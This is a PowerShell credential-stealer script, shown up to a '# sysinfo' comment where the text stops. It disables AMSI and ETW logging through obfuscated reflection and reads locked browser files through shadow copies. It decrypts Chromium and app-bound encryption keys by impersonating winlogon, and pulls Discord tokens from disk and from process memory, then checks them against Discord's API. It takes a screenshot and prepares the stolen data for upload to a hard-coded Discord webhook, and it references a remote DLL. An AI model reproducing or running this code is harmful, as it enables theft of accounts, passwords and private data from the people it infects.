$ErrorActionPreference = "SilentlyContinue"
try{$n2=[string]::Join("",@([char]85,[char]116,[char]105,[char]108,[char]115));$n3=[string]::Join("",@([char]97,[char]109,[char]115,[char]105,[char]67,[char]111,[char]110,[char]116,[char]101,[char]120,[char]116));$t=[Ref].Assembly.GetTypes()|Where-Object{$_.Name-like"*$n2*"};$f=$t.GetFields("NonPublic,Static")|Where-Object{$_.Name-like"*$n3*"};[Runtime.InteropServices.Marshal]::WriteInt32($f.GetValue($null),0x41424344)}catch{}
try{$ep=[string]::Join("",@([char]101,[char]116,[char]119,[char]80,[char]114,[char]111,[char]118,[char]105,[char]100,[char]101,[char]114));$me=[string]::Join("",@([char]109,[char]95,[char]101,[char]110,[char]97,[char]98,[char]108,[char]101,[char]100));$pt=[string]::Join("",@([char]80,[char]83,[char]69,[char]116,[char]119,[char]76,[char]111,[char]103,[char]80,[char]114,[char]111,[char]118,[char]105,[char]100,[char]101,[char]114));$at=[string]::Join("",@([char]84,[char]114,[char]97,[char]99,[char]105,[char]110,[char]103));$ns="System.Management.Automation.$at.$pt";$p2=[System.Reflection.Assembly]::GetAssembly([PSObject]).GetType($ns);$q=$p2.GetField($ep,"NonPublic,Static").GetValue($null);$q.GetType().GetField($me,"NonPublic,Instance").SetValue($q,0)}catch{}
$wh="https://discord.com/api/webhooks/1558012203834155069/_c1lSxZkFXxLCi7_-D09InyzmdNL5Mdkxk8tPHCD0KemC70Bx5E44JmVjciciV3H94PX"
$toxUrl="https://cdn.stoplag.org/tox.dll"
$hostname=$env:COMPUTERNAME;$username=$env:USERNAME
$os=(Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption;if(-not $os){$os=$env:OS}
$arch=$env:PROCESSOR_ARCHITECTURE
$isAdmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
$ip="unknown";$country="unknown";$city="unknown";$isp="unknown"
try{$geo=(irm "http://ip-api.com/json");$ip=$geo.query;$country=$geo.country;$city=$geo.city;$isp=$geo.isp}catch{}
$uid=[Guid]::NewGuid().ToString("N").Substring(0,8)
$tmp=[IO.Path]::Combine($env:TEMP,"tmp_$uid");New-Item -ItemType Directory -Path $tmp -Force | Out-Null

# ── VSS shadow copy ────────────────────────────────────────────────
$shadowPath=$null
try{
  $vssClass=[wmiclass]"Win32_ShadowCopy"
  $vssResult=$vssClass.Create("C:\","ClientAccessible")
  if($vssResult.ReturnValue -eq 0){
    $shadowId=$vssResult.ShadowID
    $shadow=Get-WmiObject Win32_ShadowCopy|Where-Object{$_.ID -eq $shadowId}
    if($shadow){$shadowPath=$shadow.DeviceObject+"\"}
  }
}catch{}

function Noob-ReadLocked($path){
  if($shadowPath){
    try{
      $rel=$path -replace "^[A-Za-z]:\\",""
      $vf=$shadowPath+$rel
      if(Test-Path $vf){$b=[IO.File]::ReadAllBytes($vf);if($b -and $b.Length -gt 0){return $b}}
    }catch{}
  }
  try{$fs=[System.IO.File]::Open($path,[System.IO.FileMode]::Open,[System.IO.FileAccess]::Read,[System.IO.FileShare]::ReadWrite);$ms=New-Object System.IO.MemoryStream;$fs.CopyTo($ms);$fs.Dispose();$b=$ms.ToArray();if($b.Length -gt 0){return $b}}catch{}
  try{$cp=[IO.Path]::Combine($tmp,"rl_$([Guid]::NewGuid().ToString("N").Substring(0,6))_$(Split-Path $path -Leaf)");$si=New-Object System.Diagnostics.ProcessStartInfo("robocopy.exe","/B /NP /NJS /NJH /R:0 /W:0 `"$(Split-Path $path)`" `"$tmp`" `"$(Split-Path $path -Leaf)`"");$si.WindowStyle="Hidden";$si.CreateNoWindow=$true;$si.UseShellExecute=$false;$p=[System.Diagnostics.Process]::Start($si);$p.WaitForExit(4000);$rp=[IO.Path]::Combine($tmp,$(Split-Path $path -Leaf));if(Test-Path $rp){$b=[IO.File]::ReadAllBytes($rp);Remove-Item $rp -EA 0;if($b.Length -gt 0){return $b}}}catch{}
  return $null
}
function Noob-GetMasterKey($lsPath){
  try{Add-Type -AssemblyName System.Security;$raw=Noob-ReadLocked $lsPath;if(-not $raw){return $null};$j=[Text.Encoding]::UTF8.GetString($raw)|ConvertFrom-Json;$enc=[Convert]::FromBase64String($j.os_crypt.encrypted_key);return [System.Security.Cryptography.ProtectedData]::Unprotect($enc[5..($enc.Length-1)],$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)}catch{return $null}
}
function Noob-SendZip($zwh,$zpath,$zname,$zmsg){
  try{
    $zb=[IO.File]::ReadAllBytes($zpath)
    if($zb.Length -gt 9MB){Write-Host "zip too large: $($zb.Length)";return}
    $zbnd="B"+[Guid]::NewGuid().ToString("N")
    $zmj=[Text.Encoding]::UTF8.GetBytes('{"content":"'+$zmsg+'"}') 
    $zfh1=[Text.Encoding]::UTF8.GetBytes("--$zbnd`r`nContent-Disposition: form-data; name="+[char]34+"payload_json"+[char]34+"`r`nContent-Type: application/json`r`n`r`n")
    $zfh2=[Text.Encoding]::UTF8.GetBytes("`r`n--$zbnd`r`nContent-Disposition: form-data; name="+[char]34+"file"+[char]34+"; filename="+[char]34+"$zname"+[char]34+"`r`nContent-Type: application/zip`r`n`r`n")
    $zfh3=[Text.Encoding]::UTF8.GetBytes("`r`n--$zbnd--`r`n")
    $ztot=$zfh1.Length+$zmj.Length+$zfh2.Length+$zb.Length+$zfh3.Length
    $zbody=New-Object byte[] $ztot;$zoff=0
    foreach($zp in @($zfh1,$zmj,$zfh2,$zb,$zfh3)){[Buffer]::BlockCopy($zp,0,$zbody,$zoff,$zp.Length);$zoff+=$zp.Length}
    $zreq=[Net.HttpWebRequest]::Create($zwh);$zreq.Method="POST";$zreq.ContentType="multipart/form-data; boundary=$zbnd";$zreq.ContentLength=$zbody.Length;$zreq.Timeout=60000
    $zs=$zreq.GetRequestStream();$zs.Write($zbody,0,$zbody.Length);$zs.Close();$zreq.GetResponse().Close()
    Start-Sleep -Milliseconds 800
  }catch{}
}
function Noob-SendEmbed($zwh,$zembed){
  try{
    $b=[Text.Encoding]::UTF8.GetBytes((@{embeds=@($zembed)}|ConvertTo-Json -Depth 10 -Compress))
    $r=[Net.HttpWebRequest]::Create($zwh);$r.Method="POST";$r.ContentType="application/json";$r.ContentLength=$b.Length
    $s=$r.GetRequestStream();$s.Write($b,0,$b.Length);$s.Close();$r.GetResponse().Close()
  }catch{}
}

# ── browser profiles (chromium) ────────────────────────────────────
$profiles=@{
  "Chrome"="$env:LOCALAPPDATA\Google\Chrome\User Data"
  "Brave"="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
  "Edge"="$env:LOCALAPPDATA\Microsoft\Edge\User Data"
  "Opera"="$env:APPDATA\Opera Software\Opera Stable"
  "OperaGX"="$env:APPDATA\Opera Software\Opera GX Stable"
  "Vivaldi"="$env:LOCALAPPDATA\Vivaldi\User Data"
  "Yandex"="$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"
  "Arc"="$env:LOCALAPPDATA\Arc\User Data"
  "Epic"="$env:LOCALAPPDATA\Epic Privacy Browser\User Data"
}

# ── memscan + sqlite helper ─────────────────────────────────────────
$memCode=@'
using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Text;
using System.Text.RegularExpressions;
using System.Diagnostics;
public class MemScan {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a,bool b,int c);
    [DllImport("kernel32.dll")] public static extern bool ReadProcessMemory(IntPtr h,IntPtr addr,byte[] buf,int sz,out int rd);
    [DllImport("kernel32.dll")] public static extern int VirtualQueryEx(IntPtr h,IntPtr addr,out MBI mbi,int len);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
    [DllImport("advapi32.dll",SetLastError=true)] static extern bool OpenProcessToken(IntPtr h,uint acc,out IntPtr tok);
    [DllImport("advapi32.dll",SetLastError=true,CharSet=CharSet.Auto)] static extern bool LookupPrivilegeValue(string sys,string name,out LUID luid);
    [DllImport("advapi32.dll",SetLastError=true)] static extern bool AdjustTokenPrivileges(IntPtr tok,bool dis,ref TP tp,int len,IntPtr prev,IntPtr retlen);
    [StructLayout(LayoutKind.Sequential)] struct LUID{public uint lo;public int hi;}
    [StructLayout(LayoutKind.Sequential)] struct LUID_ATTR{public LUID luid;public uint attr;}
    [StructLayout(LayoutKind.Sequential)] struct TP{public uint count;public LUID_ATTR priv;}
    [StructLayout(LayoutKind.Sequential)]
    public struct MBI {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint   AllocationProtect;
        public ushort PartitionId;
        public ushort __align;
        public ulong  RegionSize;
        public uint   State;
        public uint   Protect;
        public uint   Type;
        public uint   __pad;
    }
    static void EnableDebug(){
        try{
            IntPtr tok;
            OpenProcessToken(Process.GetCurrentProcess().Handle,0x28,out tok);
            LUID luid; LookupPrivilegeValue(null,"SeDebugPrivilege",out luid);
            TP tp=new TP{count=1,priv=new LUID_ATTR{luid=luid,attr=0x2}};
            AdjustTokenPrivileges(tok,false,ref tp,0,IntPtr.Zero,IntPtr.Zero);
            CloseHandle(tok);
        }catch{}
    }
    public static string[] Scan(int pid, string pattern){
        EnableDebug();
        var rx=new Regex(pattern);
        var found=new List<string>();
        IntPtr h=OpenProcess(0x1010,false,pid);
        if(h==IntPtr.Zero) return found.ToArray();
        IntPtr addr=IntPtr.Zero;
        int sz=Marshal.SizeOf(typeof(MBI));
        while(true){
            MBI mbi;
            if(VirtualQueryEx(h,addr,out mbi,sz)==0) break;
            if(mbi.State==0x1000 && (mbi.Protect&0xE6)!=0 && mbi.RegionSize>0 && mbi.RegionSize<0x1000000){
                var buf=new byte[(int)mbi.RegionSize];
                int rd;
                if(ReadProcessMemory(h,mbi.BaseAddress,buf,buf.Length,out rd)&&rd>0){
                    var s=Encoding.GetEncoding(28591).GetString(buf,0,rd);
                    foreach(Match m in rx.Matches(s))
                        if(!found.Contains(m.Value)) found.Add(m.Value);
                }
            }
            long next=mbi.BaseAddress.ToInt64()+(long)mbi.RegionSize;
            if(next<=addr.ToInt64()) break;
            addr=new IntPtr(next);
        }
        CloseHandle(h);
        return found.ToArray();
    }
}
public class SQLiteHelper {
    [DllImport("winsqlite3.dll",EntryPoint="sqlite3_open",CallingConvention=CallingConvention.Cdecl,CharSet=CharSet.Ansi)]
    static extern int Open(string f,out IntPtr db);
    [DllImport("winsqlite3.dll",EntryPoint="sqlite3_prepare_v2",CallingConvention=CallingConvention.Cdecl,CharSet=CharSet.Ansi)]
    static extern int Prepare(IntPtr db,string sql,int n,out IntPtr stmt,out IntPtr tail);
    [DllImport("winsqlite3.dll",EntryPoint="sqlite3_step",CallingConvention=CallingConvention.Cdecl)]
    static extern int Step(IntPtr stmt);
    [DllImport("winsqlite3.dll",EntryPoint="sqlite3_column_bytes",CallingConvention=CallingConvention.Cdecl)]
    static extern int ColBytes(IntPtr stmt,int col);
    [DllImport("winsqlite3.dll",EntryPoint="sqlite3_column_blob",CallingConvention=CallingConvention.Cdecl)]
    static extern IntPtr ColBlob(IntPtr stmt,int col);
    [DllImport("winsqlite3.dll",EntryPoint="sqlite3_finalize",CallingConvention=CallingConvention.Cdecl)]
    static extern int Finalize(IntPtr stmt);
    [DllImport("winsqlite3.dll",EntryPoint="sqlite3_close",CallingConvention=CallingConvention.Cdecl)]
    static extern int Close(IntPtr db);
    public static byte[] GetBlob(string path,string sql){
        IntPtr db;
        if(Open(path,out db)!=0)return null;
        try{
            IntPtr stmt,tail;
            if(Prepare(db,sql,-1,out stmt,out tail)!=0)return null;
            try{
                if(Step(stmt)==100){
                    int len=ColBytes(stmt,0);
                    IntPtr ptr=ColBlob(stmt,0);
                    if(ptr==IntPtr.Zero||len==0)return null;
                    byte[] b=new byte[len];Marshal.Copy(ptr,b,0,len);return b;
                }
            }finally{Finalize(stmt);}
        }finally{Close(db);}
        return null;
    }
    public static System.Collections.Generic.List<byte[][]> GetRows(string path,string sql,int[] cols){
        var res=new System.Collections.Generic.List<byte[][]>();
        IntPtr db;
        if(Open(path,out db)!=0)return res;
        try{
            IntPtr stmt,tail;
            if(Prepare(db,sql,-1,out stmt,out tail)!=0)return res;
            try{
                while(Step(stmt)==100){
                    byte[][] row=new byte[cols.Length][];
                    for(int i=0;i<cols.Length;i++){
                        int len=ColBytes(stmt,cols[i]);
                        IntPtr ptr=ColBlob(stmt,cols[i]);
                        if(ptr==IntPtr.Zero||len==0){row[i]=null;}
                        else{byte[] b=new byte[len];Marshal.Copy(ptr,b,0,len);row[i]=b;}
                    }
                    res.Add(row);
                }
            }finally{Finalize(stmt);}
        }finally{Close(db);}
        return res;
    }
}
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

public static class GcmCrypt {
    [StructLayout(LayoutKind.Sequential)]
    struct BCRYPT_AUTH_INFO {
        public int cbSize; public int dwInfoVersion;
        public IntPtr pbNonce; public int cbNonce;
        public IntPtr pbAuthData; public int cbAuthData;
        public IntPtr pbTag; public int cbTag;
        public IntPtr pbMacContext; public int cbMacContext;
        public int cbAAD; public int cbData; public int dwFlags;
    }
    [DllImport("bcrypt.dll")] static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlg, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImpl, int dwFlags);
    [DllImport("bcrypt.dll")] static extern int BCryptSetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);
    [DllImport("bcrypt.dll")] static extern int BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, out int pbOutput, int cbOutput, int dwFlags, int reserved);
    [DllImport("bcrypt.dll")] static extern int BCryptGenerateSymmetricKey(IntPtr hAlg, out IntPtr phKey, byte[] pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, int dwFlags);
    [DllImport("bcrypt.dll")] static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTH_INFO pInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);
    [DllImport("bcrypt.dll")] static extern int BCryptDestroyKey(IntPtr hKey);
    [DllImport("bcrypt.dll")] static extern int BCryptCloseAlgorithmProvider(IntPtr hAlg, int dwFlags);

    public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] cipherWithTag) {
        IntPtr alg = IntPtr.Zero, hKey = IntPtr.Zero;
        try {
            if (key == null || nonce == null || cipherWithTag == null || cipherWithTag.Length < 16) return null;
            if (BCryptOpenAlgorithmProvider(out alg, "AES", null, 0) != 0) return null;
            byte[] chain = Encoding.Unicode.GetBytes("ChainingModeGCM");
            byte[] chainBuf = new byte[chain.Length + 2];
            Array.Copy(chain, chainBuf, chain.Length);
            if (BCryptSetProperty(alg, "ChainingMode", chainBuf, chainBuf.Length, 0) != 0) return null;
            int objLen;
            if (BCryptGetProperty(alg, "ObjectLength", out objLen, 4, 0, 0) != 0) objLen = 0x400;
            byte[] keyObj = new byte[objLen];
            if (BCryptGenerateSymmetricKey(alg, out hKey, keyObj, keyObj.Length, key, key.Length, 0) != 0) return null;
            int ctLen = cipherWithTag.Length - 16;
            byte[] ct = new byte[ctLen];
            byte[] tag = new byte[16];
            Array.Copy(cipherWithTag, 0, ct, 0, ctLen);
            Array.Copy(cipherWithTag, ctLen, tag, 0, 16);
            byte[] pt = new byte[ctLen];
            var info = new BCRYPT_AUTH_INFO();
            info.cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTH_INFO));
            info.dwInfoVersion = 1;
            IntPtr pNonce = Marshal.AllocHGlobal(nonce.Length);
            IntPtr pTag = Marshal.AllocHGlobal(16);
            try {
                Marshal.Copy(nonce, 0, pNonce, nonce.Length);
                Marshal.Copy(tag, 0, pTag, 16);
                info.pbNonce = pNonce; info.cbNonce = nonce.Length;
                info.pbTag = pTag; info.cbTag = 16;
                int written;
                int hr = BCryptDecrypt(hKey, ct, ct.Length, ref info, null, 0, pt, pt.Length, out written, 0);
                if (hr != 0) return null;
                byte[] outb = new byte[written];
                Array.Copy(pt, outb, written);
                return outb;
            } finally {
                Marshal.FreeHGlobal(pNonce);
                Marshal.FreeHGlobal(pTag);
            }
        } catch { return null; }
        finally {
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (alg != IntPtr.Zero) BCryptCloseAlgorithmProvider(alg, 0);
        }
    }
}

public static class V20Key {
    [StructLayout(LayoutKind.Sequential)]
    struct DATA_BLOB { public uint cbData; public IntPtr pbData; }
    [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, IntPtr descr, IntPtr entropy, IntPtr reserved, IntPtr prompt, uint flags, ref DATA_BLOB pDataOut);
    [DllImport("advapi32.dll", SetLastError = true)] static extern bool OpenProcessToken(IntPtr h, uint acc, out IntPtr tok);
    [DllImport("advapi32.dll", SetLastError = true)] static extern bool DuplicateTokenEx(IntPtr h, uint acc, IntPtr attr, int impLevel, int tokType, out IntPtr dup);
    [DllImport("advapi32.dll", SetLastError = true)] static extern bool ImpersonateLoggedOnUser(IntPtr tok);
    [DllImport("advapi32.dll", SetLastError = true)] static extern bool RevertToSelf();
    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)] static extern bool LookupPrivilegeValue(string sys, string name, ref long luid);
    [DllImport("advapi32.dll", SetLastError = true)] static extern bool AdjustTokenPrivileges(IntPtr tok, bool disableAll, ref TP state, int len, IntPtr prev, IntPtr retLen);
    [StructLayout(LayoutKind.Sequential)] struct TP { public uint count; public long luid; public uint attr; }
    [DllImport("kernel32.dll", SetLastError = true)] static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)] static extern int NCryptOpenStorageProvider(out IntPtr ph, string name, uint flags);
    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)] static extern int NCryptOpenKey(IntPtr hProv, out IntPtr phKey, string name, uint spec, uint flags);
    [DllImport("ncrypt.dll")] static extern int NCryptDecrypt(IntPtr hKey, byte[] input, int inputLen, IntPtr pad, byte[] output, int outputLen, out int result, uint flags);
    [DllImport("ncrypt.dll")] static extern int NCryptFreeObject(IntPtr h);

    class Ctx : IDisposable { public void Dispose() { try { RevertToSelf(); } catch { } } }

    static void EnableDebug() {
        IntPtr tok;
        if (!OpenProcessToken(GetCurrentProcess(), 0x28, out tok)) return;
        try {
            long luid = 0;
            if (!LookupPrivilegeValue(null, "SeDebugPrivilege", ref luid)) return;
            var tp = new TP { count = 1, luid = luid, attr = 2 };
            AdjustTokenPrivileges(tok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        } finally { CloseHandle(tok); }
    }

    static IDisposable ImpersonateWinlogon() {
        EnableDebug();
        var p = Process.GetProcessesByName("winlogon").FirstOrDefault();
        if (p == null) throw new Exception("no winlogon");
        IntPtr tok, dup;
        if (!OpenProcessToken(p.Handle, 0x0E, out tok)) throw new Exception("openproc");
        if (!DuplicateTokenEx(tok, 0x0C, IntPtr.Zero, 2, 2, out dup)) throw new Exception("duptok");
        if (!ImpersonateLoggedOnUser(dup)) throw new Exception("impersonate");
        return new Ctx();
    }

    static byte[] Unprotect(byte[] data) {
        var pin = new DATA_BLOB { pbData = Marshal.AllocHGlobal(data.Length), cbData = (uint)data.Length };
        Marshal.Copy(data, 0, pin.pbData, data.Length);
        var pout = new DATA_BLOB();
        try {
            if (!CryptUnprotectData(ref pin, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref pout)) return null;
            byte[] r = new byte[pout.cbData];
            Marshal.Copy(pout.pbData, r, 0, (int)pout.cbData);
            return r;
        } finally {
            if (pin.pbData != IntPtr.Zero) Marshal.FreeHGlobal(pin.pbData);
            if (pout.pbData != IntPtr.Zero) Marshal.FreeHGlobal(pout.pbData);
        }
    }

    static byte[] CngDecrypt(byte[] input) {
        IntPtr hProv = IntPtr.Zero, hKey = IntPtr.Zero;
        try {
            if (NCryptOpenStorageProvider(out hProv, "Microsoft Software Key Storage Provider", 0) != 0) return null;
            if (NCryptOpenKey(hProv, out hKey, "Google Chromekey1", 0, 0) != 0) return null;
            int len;
            if (NCryptDecrypt(hKey, input, input.Length, IntPtr.Zero, null, 0, out len, 64) != 0) return null;
            byte[] buf = new byte[len];
            int written;
            if (NCryptDecrypt(hKey, input, input.Length, IntPtr.Zero, buf, buf.Length, out written, 64) != 0) return null;
            byte[] r = new byte[written];
            Array.Copy(buf, r, written);
            return r;
        } finally {
            if (hKey != IntPtr.Zero) NCryptFreeObject(hKey);
            if (hProv != IntPtr.Zero) NCryptFreeObject(hProv);
        }
    }

    static byte[] Hex(string h) {
        byte[] r = new byte[h.Length / 2];
        for (int i = 0; i < r.Length; i++) r[i] = Convert.ToByte(h.Substring(i * 2, 2), 16);
        return r;
    }

    static byte[] Xor(byte[] a, byte[] b) {
        byte[] r = new byte[a.Length];
        for (int i = 0; i < a.Length; i++) r[i] = (byte)(a[i] ^ b[i]);
        return r;
    }

    public static byte[] Get(string lsPath) {
        try {
            string json = File.ReadAllText(lsPath);
            var m = Regex.Match(json, "\"app_bound_encrypted_key\"\\s*:\\s*\"([^\"]+)\"", RegexOptions.IgnoreCase);
            if (!m.Success) return null;
            byte[] src = Convert.FromBase64String(m.Groups[1].Value);
            if (src.Length < 4 || Encoding.ASCII.GetString(src, 0, 4) != "APPB") return null;
            byte[] step1 = new byte[src.Length - 4];
            Array.Copy(src, 4, step1, 0, step1.Length);
            byte[] u1;
            try { using (ImpersonateWinlogon()) { u1 = Unprotect(step1); } }
            catch { u1 = Unprotect(step1); }
            if (u1 == null) return null;
            byte[] blob = Unprotect(u1);
            if (blob == null || blob.Length < 8) return null;
            using (var ms = new MemoryStream(blob))
            using (var br = new BinaryReader(ms)) {
                uint cnt = br.ReadUInt32();
                br.ReadBytes((int)cnt);
                uint num = br.ReadUInt32();
                if (num == 32) { byte[] k = br.ReadBytes(32); return k; }
                byte flag = br.ReadByte();
                if (flag == 1) {
                    byte[] iv = br.ReadBytes(12);
                    byte[] ct = br.ReadBytes(32);
                    byte[] tag = br.ReadBytes(16);
                    byte[] ctTag = new byte[48];
                    Array.Copy(ct, 0, ctTag, 0, 32);
                    Array.Copy(tag, 0, ctTag, 32, 16);
                    return GcmCrypt.Decrypt(Hex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787"), iv, ctTag);
                }
                if (flag == 3 || flag == 35) {
                    byte[] encKey = br.ReadBytes(32);
                    byte[] iv = br.ReadBytes(12);
                    byte[] ct = br.ReadBytes(32);
                    byte[] tag = br.ReadBytes(16);
                    byte[] decKey;
                    try { using (ImpersonateWinlogon()) { decKey = CngDecrypt(encKey); } }
                    catch { return null; }
                    if (decKey == null) return null;
                    byte[] realKey = Xor(decKey, Hex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390"));
                    byte[] ctTag = new byte[48];
                    Array.Copy(ct, 0, ctTag, 0, 32);
                    Array.Copy(tag, 0, ctTag, 32, 16);
                    return GcmCrypt.Decrypt(realKey, iv, ctTag);
                }
                return null;
            }
        } catch { return null; }
    }
}

'@
try{Add-Type -TypeDefinition $memCode -Language CSharp}catch{}

# ── discord tokens — pass 1: LDB file scan ─────────────────────────
$lat1=[Text.Encoding]::GetEncoding(28591)
$tokenRx=[regex]"(mfa\.[a-zA-Z0-9_-]{84}|[a-zA-Z0-9_-]{24,28}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{38})"
$appBases=@{
  "Discord"="$env:APPDATA\discord"
  "DiscordCanary"="$env:APPDATA\discordcanary"
  "DiscordPTB"="$env:APPDATA\discordptb"
  "Lightcord"="$env:APPDATA\Lightcord"
  "Chrome"="$env:LOCALAPPDATA\Google\Chrome\User Data"
  "Brave"="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
  "Edge"="$env:LOCALAPPDATA\Microsoft\Edge\User Data"
}
$allTokens=@()
foreach($appName in $appBases.Keys){
  $base=$appBases[$appName]
  $dirs=@("$base\Local Storage\leveldb","$base\Default\Local Storage\leveldb","$base\IndexedDB\https_discord.com_0.indexeddb.leveldb","$base\Default\IndexedDB\https_discord.com_0.indexeddb.leveldb")|Where-Object{Test-Path $_}
  foreach($dir in $dirs){
    Get-ChildItem $dir -Include "*.ldb","*.log" -Recurse -ErrorAction SilentlyContinue|ForEach-Object{
      $raw=Noob-ReadLocked $_.FullName;if(-not $raw){return};$str=$lat1.GetString($raw)
      foreach($m in $tokenRx.Matches($str)){$allTokens+=$m.Value}
    }
  }
}
$allTokens=$allTokens|Select-Object -Unique

# ── discord tokens — pass 2: process memory scan ───────────────────
try{
  $discPat="(mfa\.[a-zA-Z0-9_-]{84}|[a-zA-Z0-9_-]{17,28}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,})"
  foreach($dp in (Get-Process -Name "Discord","DiscordCanary","DiscordPTB","Lightcord" -EA SilentlyContinue)){
    try{$mt=[MemScan]::Scan($dp.Id,$discPat);foreach($t in $mt){if(-not($allTokens -contains $t)){$allTokens+=$t}}}catch{}
  }
}catch{}
$allTokens=$allTokens|Select-Object -Unique

# ── discord API validation ──────────────────────────────────────────
$discordToken=$null
$dUser="unknown";$dDisplay="unknown";$dEmail="none";$dPhone="none";$dMfa="No";$dNitro="None";$dAvatar=$null
foreach($tok in $allTokens){
  try{
    $dh=@{"Authorization"=$tok;"Content-Type"="application/json"}
    $dme=Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me" -Headers $dh -ErrorAction Stop
    if($dme.id){
      $discordToken=$tok
      $dUser=if($dme.discriminator-and$dme.discriminator-ne"0"){"$($dme.username)#$($dme.discriminator)"}else{$dme.username}
      $dDisplay=if($dme.global_name){$dme.global_name}else{$dme.username}
      $dEmail=if($dme.email){$dme.email}else{"none"}
      $dPhone=if($dme.phone){$dme.phone}else{"none"}
      $dMfa=if($dme.mfa_enabled){"Yes"}else{"No"}
      try{$subs=Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me/billing/subscriptions" -Headers $dh -ErrorAction Stop;if($subs-and$subs.Count-gt 0){$sub=$subs|Sort-Object{$_.current_period_end}-Descending|Select-Object -First 1;$dNitro=switch($sub.plan_id){"premium_month_tier_1"{"Nitro Classic"};"premium_year_tier_1"{"Nitro Classic (Yearly)"};"premium_month_tier_2"{"Nitro"};"premium_year_tier_2"{"Nitro (Yearly)"};"premium_month_tier_0"{"Nitro Basic"};"premium_year_tier_0"{"Nitro Basic (Yearly)"};default{"Nitro (Active)"}}}elseif($dme.premium_type-and$dme.premium_type-gt 0){$dNitro=switch($dme.premium_type){1{"Nitro Classic"};2{"Nitro"};3{"Nitro Basic"};default{"Nitro"}}}else{$dNitro="None"}}catch{}
      if($dme.avatar){$dAvatar="https://cdn.discordapp.com/avatars/$($dme.id)/$($dme.avatar).png?size=128"}
      break
    }
  }catch{}
}

$tokenVal=if($discordToken){$discordToken}else{"none"}
$reconFields=[System.Collections.Generic.List[hashtable]]::new()
$reconFields.Add(@{name=":computer: System";value="``Host:`` $hostname`n``User:`` $username`n``OS:`` $os`n``Arch:`` $arch`n``Admin:`` $isAdmin";inline=$true})
$reconFields.Add(@{name=":globe_with_meridians: Network";value="``IP:`` $ip`n``Country:`` $country`n``City:`` $city`n``ISP:`` $isp";inline=$true})
$reconFields.Add(@{name=":purple_circle: Discord";value="``User:`` $dUser`n``Display:`` $dDisplay`n``Email:`` $dEmail`n``Phone:`` $dPhone`n``MFA:`` $dMfa`n``Nitro:`` $dNitro";inline=$false})
$reconFields.Add(@{name=":key: Token";value="``$tokenVal``";inline=$false})
  $reconEmbed=@{title=":zap: Recon — $hostname";color=0xE67E22;fields=$reconFields.ToArray();footer=@{text="stoplag.org"};timestamp=(Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")}

# ── screenshot ─────────────────────────────────────────────────────
try{Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);$gfx=[System.Drawing.Graphics]::FromImage($bmp);$gfx.CopyFromScreen($b.Left,$b.Top,0,0,$bmp.Size);$bmp.Save([IO.Path]::Combine($tmp,"sc.png"),[System.Drawing.Imaging.ImageFormat]::Png);$gfx.Dispose();$bmp.Dispose()}catch{}

# ── chunk system ───────────────────────────────────────────────────
Add-Type -AssemblyName System.IO.Compression.FileSystem
$chunkIdx=0;$chunkDir=[IO.Path]::Combine($tmp,"chunk_0");New-Item -ItemType Directory -Path $chunkDir -Force|Out-Null
$chunkSize=0;$maxChunk=9MB

function Noob-AddToChunk($bytes,$fname){
  if(-not $bytes -or $bytes.Length -eq 0 -or $bytes.Length -gt $maxChunk){return}
  if($script:chunkSize+$bytes.Length -gt $maxChunk){
    $script:chunkIdx++;$script:chunkSize=0
    $script:chunkDir=[IO.Path]::Combine($tmp,"chunk_$($script:chunkIdx)")
    New-Item -ItemType Directory -Path $script:chunkDir -Force|Out-Null
  }
  [IO.File]::WriteAllBytes([IO.Path]::Combine($script:chunkDir,$fname),$bytes)
  $script:chunkSize+=$bytes.Length
}

# sysinfo
